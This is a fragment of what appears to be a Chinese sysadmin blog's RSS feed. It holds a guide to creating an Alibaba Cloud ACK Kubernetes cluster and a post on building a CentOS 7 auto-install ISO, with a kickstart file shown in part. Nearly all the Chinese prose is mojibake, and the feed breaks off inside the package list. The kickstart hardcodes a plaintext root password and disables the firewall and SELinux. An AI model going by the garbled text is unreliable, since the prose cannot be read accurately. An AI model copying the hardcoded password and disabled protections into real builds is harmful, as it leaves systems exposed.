      <guid>https://rendoumi.com/posts/20211026-ack_build/</guid>
      <description>&lt;p&gt;åœ¨ç”Ÿäº§ç¯å¢ƒæ¥åˆ›å»ºé˜¿é‡ŒACKæ‰˜ç®¡k8sé›†ç¾¤çš„è¿‡ç¨‹ï¼š&lt;/p&gt;
&lt;p&gt;å®Œå…¨ç”¨äºç”Ÿäº§ï¼Œä¸æ˜¯æ­å»ºæ¥åšæµ‹è¯•ç”¨çš„ã€‚&lt;/p&gt;
&lt;p&gt;æˆå…¬å¸å§”æ‰˜ï¼Œç»™çš„RAMç”¨æˆ·ï¼Œæ‰€ä»¥é˜¿é‡Œäº‘RAMç¬¬ä¸€æ¬¡ç™»å½•åï¼Œå¼ºåˆ¶ä¿®æ”¹å¯†ç &lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211026125509729&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211026-ack_build/image-20211026125509729.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæˆæƒèµ„æºç®¡ç†ï¼Œ   æ­£å¼å¼€å§‹å»ºç«‹è¿‡ç¨‹&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å‡†å¤‡æ¡ä»¶&#34;&gt;ä¸€ã€å‡†å¤‡æ¡ä»¶&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ä¸¤å°åŠä»¥ä¸ŠecsæœåŠ¡å™¨&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é˜¿é‡Œäº‘è´¦æˆ·ä½™é¢100å…ƒä»¥ä¸Šï¼ˆé˜¿é‡Œäº‘è¦æ±‚ï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é˜¿é‡Œäº‘ossä¸€ä¸ªï¼ˆosså’Œecsåœ¨ä¸€ä¸ªåŒºåŸŸæœ€å¥½ï¼‰&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;é¦–å…ˆé˜¿é‡Œäº‘åˆ›å»ºk8sé›†ç¾¤è¦æ±‚è‡³å°‘æœ‰ä¸¤å°ecsæœåŠ¡å™¨ï¼Œå¯ä»¥åˆ›å»ºé›†ç¾¤çš„æ—¶å€™&lt;strong&gt;å†è´­ä¹°&lt;/strong&gt;ï¼Œä¸è¦é¢„å…ˆè´­ä¹°ã€‚&lt;/p&gt;
&lt;h2 id=&#34;äºŒä¸‹é¢å¼€å§‹åˆ›å»º&#34;&gt;äºŒã€ä¸‹é¢å¼€å§‹åˆ›å»ºï¼š&lt;/h2&gt;
&lt;p&gt;é˜¿é‡Œäº‘æœ€å·¦ä¸Šè§’çš„èœå•ï¼ˆæ–°ç‰ˆæœ¬é¦–é¡µï¼‰-&amp;gt;äº§å“ä¸æœåŠ¡-&amp;gt;å®¹å™¨æœåŠ¡kubernetesç‰ˆæœ¬&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€æ¬¡åˆ›å»ºä¼šè®©å¼€å¯ramæˆæƒï¼Œæ­£å¸¸ç‚¹å‡»æˆæƒå°±å¯ä»¥&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211026-ack_build/image-20211026125651594.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»åˆ›å»ºé›†ç¾¤&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211026130410655&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211026-ack_build/image-20211026130410655.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»åå¦‚ä¸‹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211026130535880&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211026-ack_build/image-20211026130535880.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å„ä¸ªé€‰é¡¹çš„è¯¦ç»†è¯´æ˜ï¼š&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€éƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211026130641164&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211026-ack_build/image-20211026130641164.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é›†ç¾¤ç‰ˆæœ¬ï¼š æœ€ä¸Šé¢å¯ä»¥é€‰æ‹©ACKæ‰˜ç®¡ç‰ˆï¼Œå’Œå…¶ä»–4ä¸ªç‰ˆæœ¬ï¼Œç€é‡è¯´ä¸€ä¸‹ä¸“æœ‰ç‰ˆå’Œæ‰˜ç®¡ç‰ˆçš„åŒºåˆ«&lt;/p&gt;
&lt;p&gt;ä¸“æœ‰ç‰ˆæœ¬ï¼šmasterå’Œworkeréƒ½éœ€è¦è‡ªå·±åˆ›å»ºï¼Œå¦‚æœéœ€è¦é«˜å¯ç”¨ï¼Œé‚£ä¹ˆmasteréœ€è¦è‡³å°‘ä¸‰ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ ä¸æƒ³æŠŠmasterå’Œworkeræ”¾åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œå°±è¦å¤šä½¿ç”¨ä¸‰å°æœåŠ¡å™¨ã€‚&lt;/p&gt;
&lt;p&gt;ACKæ‰˜ç®¡ç‰ˆï¼šmasterç”±é˜¿é‡Œäº‘ç»™åˆ›å»ºï¼Œè‡ªå·±åªéœ€è¦è´­ä¹°workeræœåŠ¡å™¨ã€‚&lt;/p&gt;
&lt;p&gt;é›†ç¾¤åç§°ï¼š k8s-hbb&lt;/p&gt;
&lt;p&gt;åœ°åŸŸï¼š è¯·é€‰æ‹©è‡ªå·±ecså’Œrdsç­‰èµ„æºæ‰€åœ¨åŒºåŸŸï¼Œè¿™é‡Œæ˜¯åä¸œ2ï¼ˆä¸Šæµ·ï¼‰&lt;/p&gt;
&lt;p&gt;Kubernetesç‰ˆæœ¬ï¼šé˜¿é‡Œäº‘å·²ç»åšå¥½å……åˆ†çš„æµ‹è¯•äº†ï¼Œæ‰€ä»¥é€‰æ‹©é»˜è®¤çš„å³å¯ã€‚è¿™é‡Œæ˜¯ 1.18.8-aliyun.1&lt;/p&gt;
&lt;p&gt;å®¹å™¨è¿è¡Œæ—¶ï¼š Docker 19.03.5&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211026130846435&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211026-ack_build/image-20211026130846435.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒéƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211026130933798&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211026-ack_build/image-20211026130933798.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸“æœ‰ç½‘ç»œ: ä¸“æœ‰ç½‘ç»œé€‰æ‹©å’Œecsï¼ŒrdsåŒä¸€ä¸ªä¸“æœ‰ç½‘ç»œï¼Œè¿™é‡Œæ˜¯vpc-uf6pcr7nvp3dqmx86yyk0ï¼Œç½‘æ®µæ˜¯172.19.0.0/16&lt;/p&gt;
&lt;p&gt;è™šæ‹Ÿäº¤æ¢æœºï¼š åŒä¸€ä¸ªä¸“æœ‰ç½‘ç»œä¸‹é¢çš„äº¤æ¢æœºæ˜¯å¯ä»¥äº’é€šçš„ï¼Œè¿™é‡Œæ–°å»ºä¸€ä¸ªè™šæ‹Ÿäº¤æ¢æœºï¼Œç½‘æ®µæ˜¯172.19.240.0/20&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211026131011787&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211026-ack_build/image-20211026131011787.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç½‘ç»œæ’ä»¶ï¼š é€‰Flannelï¼Œé™¤å»é˜¿é‡Œäº‘è‡ªå·±çš„åŒºåˆ«æè¿°ï¼Œè¿˜æœ‰ä¸€ç‚¹  å¦‚æœä½¿ç”¨flannelæ’ä»¶ï¼Œåˆ™workerç«¯å¯¹å¤–ï¼Œè®¿é—®å¤–ç½‘ï¼ˆæ¯”å¦‚çŸ­ä¿¡æ¥å£ç­‰ï¼‰ä½¿ç”¨çš„æ˜¯worderæ‰€åœ¨ecsè‡ªå·±çš„eipæˆ–è€…å¦‚æœä½¿ç”¨çš„æ˜¯snatæ¨¡å¼ï¼Œå°±æ˜¯snatç»‘å®šçš„eipã€‚å¦‚æœä½¿ç”¨çš„terwayæ’ä»¶åˆ™èµ°çš„å°±æ˜¯snatçš„eipã€‚æ³¨æ„ï¼Œåˆ›å»ºé›†ç¾¤æˆåŠŸåï¼Œä¼šä¸ºé›†ç¾¤åˆ›å»ºä¸€ä¸ªå¯¹å¤–æœåŠ¡çš„ingressçš„slbï¼Œworkerå†…éƒ¨çš„å®¹å™¨ç›´æ¥å¯¹å¤–è®¿é—®ï¼Œä½¿ç”¨çš„ä¸æ˜¯è¿™ä¸ªslbçš„ipã€‚slbåªæ˜¯è¿›æ¥çš„é€šé“ã€‚&lt;/p&gt;
&lt;p&gt;podç½‘ç»œ CIDRï¼šä¸ºç»Ÿä¸€èµ·è§ï¼Œ10.240.0.0/20&lt;/p&gt;
&lt;p&gt;service CIDRï¼šä¸ºç»Ÿä¸€èµ·è§ï¼Œ192.168.240.0/20&lt;/p&gt;
&lt;p&gt;æ³¨æ„ä»¥ä¸Š å»ºç«‹å¥½äº†ä¸‰ä¸ªç½‘æ®µï¼Œä¸‰ä¸ªç½‘æ®µä¸­å‡æœ‰240å­—æ®µï¼Œä¾¿äºè®°å¿†&lt;/p&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;ECS(2å°)ï¼š172.19.240.0/20&lt;/p&gt;
&lt;p&gt;PODç½‘æ®µï¼š10.240.0.0/20&lt;/p&gt;
&lt;p&gt;Serviceç½‘æ®µï¼š192.168.240.0/20 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;â€‹&lt;/p&gt;
&lt;p&gt;èŠ‚ç‚¹IPæ•°é‡ï¼š256ï¼ŒæŒ‡å•ä¸ªèŠ‚ç‚¹å¯è¿è¡Œ Pod æ•°é‡çš„ä¸Šé™ã€‚ &lt;strong&gt;ä¸€å®šè¦æ‹‰åˆ°æœ€å¤§é‡256&lt;/strong&gt; ï¼Œå¼„åˆ°16çš„è¯ï¼Œä¸€ä¸ªèŠ‚ç‚¹æœ¬èº«è¦è·‘10å¤šä¸ªsystemçš„podï¼Œå°±æ— æ³•è·‘åº”ç”¨podäº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20211026131504133&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20211026-ack_build/image-20211026131504133.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Centos auto install cdromè‡ªåŠ¨å®‰è£…cdromçš„åˆ¶ä½œ</title>
      <link>https://rendoumi.com/posts/20211025-autoinstall_cd/</link>
      <pubDate>Mon, 25 Oct 2021 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211025-autoinstall_cd/</guid>
      <description>&lt;p&gt;ä¹‹å‰ä»‹ç»è¿‡å¦‚ä½•åˆ¶ä½œä¸€ä¸ª &lt;a href=&#34;../20211010-live_cd/&#34;&gt;centos live cdrom&lt;/a&gt; ç³»ç»Ÿ&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆï¼ŒæŸäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½æ— æ³•å¼„ä¸€ä¸ª pxe ç³»ç»Ÿï¼Œè€Œåªèƒ½é€šè¿‡ idrac æŒ‚è½½ iso çš„æ–¹å¼å®‰è£…ç³»ç»Ÿ&lt;/p&gt;
&lt;p&gt;è¯¥å¦‚ä½•å»åšå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ä¸‹è½½centosçš„minimalå®‰è£…å…‰ç›˜&#34;&gt;ä¸€ã€ä¸‹è½½Centosçš„minimalå®‰è£…å…‰ç›˜&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget http://mirrors.163.com/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2009.iso
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install -y mkisofs
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;äºŒå‡†å¤‡kickstartå®‰è£…æ–‡ä»¶&#34;&gt;äºŒã€å‡†å¤‡kickstartå®‰è£…æ–‡ä»¶&lt;/h2&gt;
&lt;p&gt;ä¸‹è½½ï¼š &lt;a href=&#34;centos7.ks&#34;&gt;centos7.ks&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;text&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;skipx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;install&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;auth  --useshadow  --enablemd5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;authconfig --enableshadow --passalgo&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;sha512&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;firstboot --disable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;keyboard us&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;lang en_US.UTF-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;reboot&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;cdrom&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;firewall --disable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;selinux  --disabled&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;services --enabled&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;chronyd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;logging level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;info&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#ignoredisk --only-use=vda&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;ignoredisk --only-use&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;sda&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#bootloader --location=mbr --append=&amp;#34;net.ifnames=0 biosdevname=0 crashkernel=auto&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;bootloader --location&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;mbr --append=&amp;#34;crashkernel=auto&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;rootpw --plaintext Renren2021!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;timezone Asia/Shanghai --isUtc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;network  --device&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;lo --hostname=localhost.localdomain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;user --name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;supdev --gid=511 --groups=&amp;#34;supdev&amp;#34; --uid=511 --password=&amp;#34;Renren2021!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;zerombr&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;clearpart --all --initlabel &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;part biosboot --fstype&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;biosboot --size=1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;part /boot --fstype ext4 --size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;2048 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;part swap  --asprimary   --size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;8192&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;part /     --fstype ext4 --size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;1 --grow&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#part biosboot --fstype=biosboot --size=1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#part /boot --fstype ext2 --size 250&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#part pv.01 --size 1 --grow&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#volgroup vg pv.01&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#logvol / --vgname=vg --size=1 --grow --fstype ext4 --fsoptions=discard,noatime --name=root&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#logvol /tmp --vgname=vg --size=1024 --fstype ext4 --fsoptions=discard,noatime --name=tmp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#logvol swap --vgname=vg --recommended --name=swap&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#uefi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#partition /boot/efi --asprimary --fstype=vfat --label EFI  --size=200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#partition /boot     --asprimary --fstype=ext4 --label BOOT --size=500&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#partition /         --asprimary --fstype=ext4 --label ROOT --size=4096 --grow&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;services --enabled&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;network&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;reboot&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;%pre&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;parted -s /dev/sda mklabel gpt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;%end&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;%packages&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;@core&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;@system-admin-tools&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;@additional-devel&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;@virtualization-client&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;@virtualization-platform&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;@virtualization-tools&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;libguestfs-tools-c&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;perl-Sys-Virt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;qemu-guest-agent&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;qemu-kvm-tools&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;curl&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;dstat&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;expect&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;openssl&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;initscripts&lt;/span&gt;
